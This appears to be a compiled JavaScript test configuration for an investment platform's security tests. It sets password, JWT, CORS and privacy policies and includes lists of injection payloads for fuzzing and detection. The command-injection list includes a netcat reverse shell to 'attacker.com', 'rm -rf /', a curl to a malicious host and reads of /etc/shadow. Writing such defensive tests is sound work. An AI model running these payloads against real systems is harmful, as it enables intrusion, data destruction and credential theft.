"use strict";
/**
 * Security Testing Configuration
 *
 * This file contains configuration and utilities for security testing
 * including test data, mock services, and security validation helpers.
 */
Object.defineProperty(exports, "__esModule", { value: true });
exports.SecurityTestUtils = exports.PRIVACY_TEST_CONFIG = exports.COMPLIANCE_TEST_CONFIG = exports.SECURITY_TEST_DATA = exports.SECURITY_TEST_CONFIG = void 0;
exports.SECURITY_TEST_CONFIG = {
    // Password policy configuration
    passwordPolicy: {
        minLength: 12,
        requireUppercase: true,
        requireLowercase: true,
        requireNumbers: true,
        requireSpecialChars: true,
        maxAge: 90,
        preventReuse: 12,
        lockoutThreshold: 5,
        lockoutDuration: 900 // 15 minutes in seconds
    },
    // JWT configuration
    jwtConfig: {
        algorithm: 'HS256',
        maxAge: 3600,
        refreshMaxAge: 604800,
        issuer: 'investment-ai-agent',
        audience: 'investment-ai-users'
    },
    // Rate limiting configuration
    rateLimiting: {
        general: {
            windowMs: 15 * 60 * 1000,
            maxRequests: 100
        },
        authentication: {
            windowMs: 15 * 60 * 1000,
            maxRequests: 5
        },
        fileUpload: {
            windowMs: 60 * 60 * 1000,
            maxRequests: 10
        }
    },
    // File upload security
    fileUpload: {
        maxFileSize: 10 * 1024 * 1024,
        allowedMimeTypes: [
            'text/csv',
            'application/pdf',
            'application/vnd.ms-excel',
            'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            'application/json',
            'text/plain'
        ],
        quarantineDirectory: '/tmp/quarantine',
        scanTimeout: 30000 // 30 seconds
    },
    // Encryption configuration
    encryption: {
        algorithm: 'aes-256-gcm',
        keyLength: 32,
        ivLength: 16,
        tagLength: 16,
        saltLength: 16
    },
    // Session management
    session: {
        maxAge: 3600,
        secure: true,
        httpOnly: true,
        sameSite: 'strict',
        regenerateOnLogin: true
    },
    // CORS configuration
    cors: {
        allowedOrigins: process.env.ALLOWED_ORIGINS?.split(',') || ['https://localhost:3000'],
        allowedMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
        allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
        credentials: true,
        maxAge: 86400 // 24 hours
    },
    // Security headers
    securityHeaders: {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'",
        'Referrer-Policy': 'strict-origin-when-cross-origin',
        'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
    }
};
exports.SECURITY_TEST_DATA = {
    // Weak passwords for testing
    weakPasswords: [
        '123456',
        'password',
        'qwerty',
        'abc123',
        '12345678',
        'password123',
        'admin',
        'letmein',
        'welcome',
        'monkey'
    ],
    // Strong passwords for testing
    strongPasswords: [
        'SecureP@ssw0rd123!',
        'MyStr0ng&C0mpl3xP@ssw0rd',
        'Inv3stm3nt@I_Ag3nt2024!',
        'C0mpl1@nt&S3cur3P@ss',
        'Str0ng!P@ssw0rd#2024'
    ],
    // SQL injection payloads
    sqlInjectionPayloads: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM sensitive_data --",
        "admin'--",
        "admin'/*",
        "' OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    ],
    // XSS payloads
    xssPayloads: [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>',
        '<marquee onstart="alert(\'XSS\')">',
        '<video><source onerror="alert(\'XSS\')">'
    ],
    // Command injection payloads
    commandInjectionPayloads: [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& curl malicious-site.com',
        '`whoami`',
        '$(id)',
        '; nc -e /bin/sh attacker.com 4444',
        '| ls -la',
        '&& echo "hacked"',
        '; cat /etc/shadow',
        '`cat /proc/version`'
    ],
    // Path traversal payloads
    pathTraversalPayloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '../../../proc/self/environ',
        '..\\..\\..\\boot.ini',
        '../../../var/log/apache/access.log',
        '....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam'
    ],
    // LDAP injection payloads
    ldapInjectionPayloads: [
        '*)(uid=*))(|(uid=*',
        '*)(|(password=*))',
        '*)(&(password=*))',
        '*))%00',
        '*()|%26\'',
        '*)(objectClass=*',
        '*))(|(objectClass=*',
        '*)(cn=*))(|(cn=*',
        '*))(|(mail=*@*',
        '*)(userPassword=*'
    ],
    // NoSQL injection payloads
    nosqlInjectionPayloads: [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.match(/.*/)"}',
        '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
        '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}',
        '{"$where": "return true"}',
        '{"$regex": "^.*$"}',
        '{"$exists": true}',
        '{"$type": 2}'
    ],
    // PII test data
    piiTestData: {
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111',
        email: 'john.doe@example.com',
        phone: '555-123-4567',
        address: '123 Main Street, Anytown, USA',
        ipAddress: '192.168.1.1',
        dateOfBirth: '01/01/1990'
    },
    // Malicious file content
    maliciousFileContent: {
        scriptInjection: '<script>alert("XSS in file")</script>',
        sqlInjection: "'; DROP TABLE files; --",
        commandInjection: '; rm -rf /',
        pathTraversal: '../../../etc/passwd',
        binaryPayload: Buffer.from([0x4d, 0x5a, 0x90, 0x00]) // PE header
    }
};
exports.COMPLIANCE_TEST_CONFIG = {
    // Regulatory frameworks
    regulations: {
        sec: {
            name: 'SEC Investment Company Act',
            jurisdiction: 'US',
            applicableInvestmentTypes: ['stock', 'bond', 'etf', 'mutual-fund'],
            concentrationLimits: {
                singleIssuer: 0.05,
                singleSector: 0.25,
                illiquidAssets: 0.15 // 15%
            }
        },
        mifidII: {
            name: 'MiFID II',
            jurisdiction: 'EU',
            applicableInvestmentTypes: ['stock', 'bond', 'derivative', 'commodity'],
            suitabilityRequirements: true,
            bestExecutionRequired: true,
            complexInstrumentWarnings: true
        },
        gdpr: {
            name: 'General Data Protection Regulation',
            jurisdiction: 'EU',
            dataSubjectRights: [
                'access', 'rectification', 'erasure', 'portability',
                'restriction', 'objection', 'automated-decision-making'
            ],
            processingTimeframes: {
                standardRequest: 30,
                complexRequest: 90 // days
            }
        },
        ccpa: {
            name: 'California Consumer Privacy Act',
            jurisdiction: 'US-CA',
            consumerRights: [
                'know', 'delete', 'opt-out', 'non-discrimination'
            ],
            processingTimeframes: {
                standardRequest: 45,
                verificationRequired: true
            }
        }
    },
    // ESG criteria
    esgCriteria: {
        environmental: [
            'carbon_emissions',
            'water_usage',
            'waste_management',
            'renewable_energy',
            'environmental_compliance'
        ],
        social: [
            'labor_practices',
            'human_rights',
            'community_impact',
            'product_safety',
            'data_privacy'
        ],
        governance: [
            'board_independence',
            'executive_compensation',
            'shareholder_rights',
            'business_ethics',
            'risk_management'
        ]
    },
    // Risk assessment criteria
    riskCriteria: {
        marketRisk: {
            volatilityThresholds: {
                low: 0.15,
                medium: 0.30,
                high: 0.50,
                veryHigh: 0.80
            },
            betaThresholds: {
                low: 0.8,
                medium: 1.2,
                high: 1.8,
                veryHigh: 2.5
            }
        },
        creditRisk: {
            ratingThresholds: {
                investmentGrade: ['AAA', 'AA', 'A', 'BBB'],
                speculativeGrade: ['BB', 'B', 'CCC', 'CC', 'C'],
                default: ['D']
            }
        },
        liquidityRisk: {
            tradingVolumeThresholds: {
                high: 1000000,
                medium: 100000,
                low: 10000,
                veryLow: 1000
            }
        }
    }
};
exports.PRIVACY_TEST_CONFIG = {
    // Data categories for privacy testing
    dataCategories: {
        personalIdentifiers: [
            'name', 'email', 'phone', 'address', 'ssn', 'passport',
            'drivers_license', 'employee_id', 'customer_id'
        ],
        financialData: [
            'bank_account', 'credit_card', 'investment_account',
            'transaction_history', 'credit_score', 'income'
        ],
        biometricData: [
            'fingerprint', 'facial_recognition', 'voice_print',
            'retina_scan', 'dna_profile'
        ],
        healthData: [
            'medical_records', 'health_insurance', 'prescription_history',
            'mental_health', 'genetic_information'
        ],
        behavioralData: [
            'browsing_history', 'search_queries', 'location_data',
            'app_usage', 'social_media_activity'
        ]
    },
    // Consent purposes
    consentPurposes: [
        {
            id: 'essential_services',
            name: 'Essential Services',
            description: 'Core functionality of the investment platform',
            required: true,
            category: 'necessary'
        },
        {
            id: 'personalization',
            name: 'Personalization',
            description: 'Customize investment recommendations',
            required: false,
            category: 'preferences'
        },
        {
            id: 'marketing',
            name: 'Marketing Communications',
            description: 'Send promotional emails and updates',
            required: false,
            category: 'marketing'
        },
        {
            id: 'analytics',
            name: 'Analytics and Improvement',
            description: 'Analyze usage patterns to improve services',
            required: false,
            category: 'analytics'
        },
        {
            id: 'third_party_sharing',
            name: 'Third-Party Sharing',
            description: 'Share data with trusted partners',
            required: false,
            category: 'sharing'
        }
    ],
    // Data retention periods (in days)
    retentionPeriods: {
        personalData: 7 * 365,
        financialTransactions: 7 * 365,
        auditLogs: 7 * 365,
        systemLogs: 2 * 365,
        marketingData: 3 * 365,
        analyticsData: 2 * 365,
        sessionData: 30,
        temporaryFiles: 7 // 7 days
    },
    // Countries with adequacy decisions (GDPR)
    adequateCountries: [
        'Andorra', 'Argentina', 'Canada', 'Faroe Islands', 'Guernsey',
        'Israel', 'Isle of Man', 'Japan', 'Jersey', 'New Zealand',
        'South Korea', 'Switzerland', 'United Kingdom', 'Uruguay'
    ]
};
// Security testing utilities
class SecurityTestUtils {
    /**
     * Generate test JWT token
     */
    static generateTestJWT(payload, secret = 'test-secret', expiresIn = '1h') {
        const jwt = require('jsonwebtoken');
        return jwt.sign(payload, secret, { expiresIn });
    }
    /**
     * Generate expired JWT token
     */
    static generateExpiredJWT(payload, secret = 'test-secret') {
        const jwt = require('jsonwebtoken');
        return jwt.sign(payload, secret, { expiresIn: '-1h' });
    }
    /**
     * Generate malicious file for testing
     */
    static generateMaliciousFile(type) {
        switch (type) {
            case 'script':
                return Buffer.from(exports.SECURITY_TEST_DATA.maliciousFileContent.scriptInjection);
            case 'sql':
                return Buffer.from(exports.SECURITY_TEST_DATA.maliciousFileContent.sqlInjection);
            case 'command':
                return Buffer.from(exports.SECURITY_TEST_DATA.maliciousFileContent.commandInjection);
            case 'binary':
                return exports.SECURITY_TEST_DATA.maliciousFileContent.binaryPayload;
            default:
                return Buffer.from('malicious content');
        }
    }
    /**
     * Validate password strength
     */
    static validatePasswordStrength(password) {
        const feedback = [];
        let score = 0;
        if (password.length >= exports.SECURITY_TEST_CONFIG.passwordPolicy.minLength) {
            score += 20;
        }
        else {
            feedback.push(`Password must be at least ${exports.SECURITY_TEST_CONFIG.passwordPolicy.minLength} characters long`);
        }
        if (/[A-Z]/.test(password)) {
            score += 20;
        }
        else {
            feedback.push('Password must contain at least one uppercase letter');
        }
        if (/[a-z]/.test(password)) {
            score += 20;
        }
        else {
            feedback.push('Password must contain at least one lowercase letter');
        }
        if (/\d/.test(password)) {
            score += 20;
        }
        else {
            feedback.push('Password must contain at least one number');
        }
        if (/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
            score += 20;
        }
        else {
            feedback.push('Password must contain at least one special character');
        }
        return {
            isStrong: score >= 80,
            score,
            feedback
        };
    }
    /**
     * Check if input contains potential injection
     */
    static containsInjection(input) {
        return {
            hasSQLInjection: exports.SECURITY_TEST_DATA.sqlInjectionPayloads.some(payload => input.toLowerCase().includes(payload.toLowerCase())),
            hasXSS: exports.SECURITY_TEST_DATA.xssPayloads.some(payload => input.toLowerCase().includes(payload.toLowerCase())),
            hasCommandInjection: exports.SECURITY_TEST_DATA.commandInjectionPayloads.some(payload => input.includes(payload)),
            hasPathTraversal: exports.SECURITY_TEST_DATA.pathTraversalPayloads.some(payload => input.includes(payload))
        };
    }
}
exports.SecurityTestUtils = SecurityTestUtils;
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoic2VjdXJpdHktY29uZmlnLmpzIiwic291cmNlUm9vdCI6IiIsInNvdXJjZXMiOlsiLi4vLi4vc3JjL19fdGVzdHNfXy9zZWN1cml0eS1jb25maWcudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IjtBQUFBOzs7OztHQUtHOzs7QUFFVSxRQUFBLG9CQUFvQixHQUFHO0lBQ2xDLGdDQUFnQztJQUNoQyxjQUFjLEVBQUU7UUFDZCxTQUFTLEVBQUUsRUFBRTtRQUNiLGdCQUFnQixFQUFFLElBQUk7UUFDdEIsZ0JBQWdCLEVBQUUsSUFBSTtRQUN0QixjQUFjLEVBQUUsSUFBSTtRQUNwQixtQkFBbUIsRUFBRSxJQUFJO1FBQ3pCLE1BQU0sRUFBRSxFQUFFO1FBQ1YsWUFBWSxFQUFFLEVBQUU7UUFDaEIsZ0JBQWdCLEVBQUUsQ0FBQztRQUNuQixlQUFlLEVBQUUsR0FBRyxDQUFDLHdCQUF3QjtLQUM5QztJQUVELG9CQUFvQjtJQUNwQixTQUFTLEVBQUU7UUFDVCxTQUFTLEVBQUUsT0FBTztRQUNsQixNQUFNLEVBQUUsSUFBSTtRQUNaLGFBQWEsRUFBRSxNQUFNO1FBQ3JCLE1BQU0sRUFBRSxxQkFBcUI7UUFDN0IsUUFBUSxFQUFFLHFCQUFxQjtLQUNoQztJQUVELDhCQUE4QjtJQUM5QixZQUFZLEVBQUU7UUFDWixPQUFPLEVBQUU7WUFDUCxRQUFRLEVBQUUsRUFBRSxHQUFHLEVBQUUsR0FBRyxJQUFJO1lBQ3hCLFdBQVcsRUFBRSxHQUFHO1NBQ2pCO1FBQ0QsY0FBYyxFQUFFO1lBQ2QsUUFBUSxFQUFFLEVBQUUsR0FBRyxFQUFFLEdBQUcsSUFBSTtZQUN4QixXQUFXLEVBQUUsQ0FBQztTQUNmO1FBQ0QsVUFBVSxFQUFFO1lBQ1YsUUFBUSxFQUFFLEVBQUUsR0FBRyxFQUFFLEdBQUcsSUFBSTtZQUN4QixXQUFXLEVBQUUsRUFBRTtTQUNoQjtLQUNGO0lBRUQsdUJBQXVCO0lBQ3ZCLFVBQVUsRUFBRTtRQUNWLFdBQVcsRUFBRSxFQUFFLEdBQUcsSUFBSSxHQUFHLElBQUk7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